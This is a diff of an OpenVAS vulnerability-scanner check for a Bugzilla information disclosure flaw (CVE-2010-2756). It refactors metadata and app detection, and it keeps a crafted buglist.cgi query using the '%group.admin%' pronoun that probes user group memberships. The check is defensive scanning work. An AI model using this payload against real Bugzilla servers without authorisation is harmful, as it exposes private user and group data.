@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bugzilla_info_disclosure_vuln.nasl 7015 2017-08-28 11:51:24Z teissa $
+# $Id: gb_bugzilla_info_disclosure_vuln.nasl 8527 2018-01-25 07:33:25Z ckuersteiner $
 #
 # Bugzilla Informaton Disclosure Vulnerability
 #
@@ -24,97 +24,96 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation will allows attackers to search for bugs that were
-  reported by users belonging to one more groups.
-  Impact Level: Application";
-tag_affected = "Bugzilla 2.19.1 to 3.2.7, 3.3.1 to 3.4.7, 3.5.1 to 3.6.1 and 3.7 to 3.7.2";
-tag_insight = "The flaw is due to an error in 'Search.pm' which allows remote attackers
-  to determine the group memberships of arbitrary users via vectors involving the
-  Search interface, boolean charts, and group-based pronouns.";
-tag_solution = "Upgrade to Bugzilla version 3.2.8, 3.4.8, 3.6.2 or 3.7.3
-  For updates refer to http://www.bugzilla.org/download/";
-tag_summary = "This host is running Bugzilla and is prone to information
-  disclosure vulnerability.";
+CPE = "cpe:/a:mozilla:bugzilla";
 
 if(description)
 {
-  script_id(801570);
-  script_version("$Revision: 7015 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-08-28 13:51:24 +0200 (Mon, 28 Aug 2017) $");
+  script_oid("1.3.6.1.4.1.25623.1.0.801570");
+  script_version("$Revision: 8527 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-01-25 08:33:25 +0100 (Thu, 25 Jan 2018) $");
   script_tag(name:"creation_date", value:"2011-01-20 07:52:11 +0100 (Thu, 20 Jan 2011)");
   script_cve_id("CVE-2010-2756");
   script_bugtraq_id(42275);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
+
   script_name("Bugzilla Informaton Disclosure Vulnerability");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/41128");
-  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/2205");
-  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/2035");
-  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/2035");
-  script_xref(name : "URL" , value : "https://bugzilla.mozilla.org/show_bug.cgi?id=417048");
+
+  script_xref(name: "URL", value: "http://secunia.com/advisories/41128");
+  script_xref(name: "URL", value: "http://www.vupen.com/english/advisories/2010/2205");
+  script_xref(name: "URL", value: "http://www.vupen.com/english/advisories/2010/2035");
+  script_xref(name: "URL", value: "http://www.vupen.com/english/advisories/2010/2035");
+  script_xref(name: "URL", value: "https://bugzilla.mozilla.org/show_bug.cgi?id=417048");
 
   script_tag(name:"qod_type", value:"remote_vul");
+
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("bugzilla_detect.nasl");
+  script_mandatory_keys("bugzilla/installed");
   script_require_ports("Services/www", 80);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+
+  script_tag(name: "impact", value: "Successful exploitation will allows attackers to search for bugs that were
+reported by users belonging to one more groups.");
+
+  script_tag(name: "affected", value: "Bugzilla 2.19.1 to 3.2.7, 3.3.1 to 3.4.7, 3.5.1 to 3.6.1 and 3.7 to 3.7.2");
+
+  script_tag(name: "insight", value: "The flaw is due to an error in 'Search.pm' which allows remote attackers to
+determine the group memberships of arbitrary users via vectors involving the Search interface, boolean charts, and
+group-based pronouns.");
+
+  script_tag(name: "solution", value: "Upgrade to Bugzilla version 3.2.8, 3.4.8, 3.6.2 or 3.7.3. For updates refer
+to http://www.bugzilla.org/download/");
+
+  script_tag(name: "summary", value: "This host is running Bugzilla and is prone to information disclosure
+vulnerability.");
+
   exit(0);
 }
 
+include("host_details.inc");
 include("http_func.inc");
 include("version_func.inc");
 include("http_keepalive.inc");
 
-port = get_http_port(default:80);
-if(!get_port_state(port)){
+if (!port = get_app_port(cpe: CPE))
   exit(0);
-}
 
-## Get the version
-vers = get_kb_item("www/" + port + "/bugzilla/version");
-if(!vers){
- exit(0);
-}
+infos = get_app_version_and_location(cpe: CPE, port: port, exit_no_version: TRUE);
+vers = infos['version'];
+dir = infos['location'];
 
 ## check for  only vuln versions
 if(version_in_range(version:vers, test_version: "3.7", test_version2:"3.7.2")||
    version_in_range(version:vers, test_version: "3.5.1", test_version2:"3.6.1")||
    version_in_range(version:vers, test_version: "3.3.1", test_version2:"3.4.7")||
-   version_in_range(version:vers, test_version: "2.19.1", test_version2:"3.2.7"))
-{
-  ## get the installed path
-  dir = get_dir_from_kb(port:port,app:"bugzilla");
-  if(dir)
-  {
-    ## Construct the exploit string
-    exploit = "/buglist.cgi?query_format=advanced&bug_status=CLOSED&" +
-              "field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0"+
-              "%3D%25group.admin%25";
+   version_in_range(version:vers, test_version: "2.19.1", test_version2:"3.2.7")) {
+  ## Construct the exploit string
+  exploit = "/buglist.cgi?query_format=advanced&bug_status=CLOSED&" +
+            "field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0"+
+            "%3D%25group.admin%25";
 
-    ## Construct the request
-    req = string("GET ", dir, exploit, " HTTP/1.1\r\n",
-                 "Host: 209.132.180.131\r\n",
-                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
-                 "Accept-Language: en-us,en;q=0.5\r\n",
-                 "Accept-Encoding: gzip,deflate\r\n",
-                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
-                 "Keep-Alive: 300\r\n",
-                 "Connection: keep-alive\r\n\r\n");
+  ## Construct the request
+  req = string("GET ", dir, exploit, " HTTP/1.1\r\n",
+               "Host: 209.132.180.131\r\n",
+               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
+               "Accept-Language: en-us,en;q=0.5\r\n",
+               "Accept-Encoding: gzip,deflate\r\n",
+               "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
+               "Keep-Alive: 300\r\n",
+               "Connection: keep-alive\r\n\r\n");
 
-    resp = http_keepalive_send_recv(port:port, data:req);
-    if(resp)
-    {
-       ## Check for the exploit
-       if(eregmatch(pattern:"field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0%3D%25group.admin%25/i",
-                    string:resp, icase:TRUE)){
-         security_message(port:port);
-       }
-    }
+  resp = http_keepalive_send_recv(port:port, data:req);
+
+  if (resp) {
+     ## Check for the exploit
+     if (eregmatch(pattern:"field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0%3D%25group.admin%25/i",
+                  string:resp, icase:TRUE)) {
+       security_message(port: port);
+       exit(0);
+     }
   }
 }
+
+exit(0);
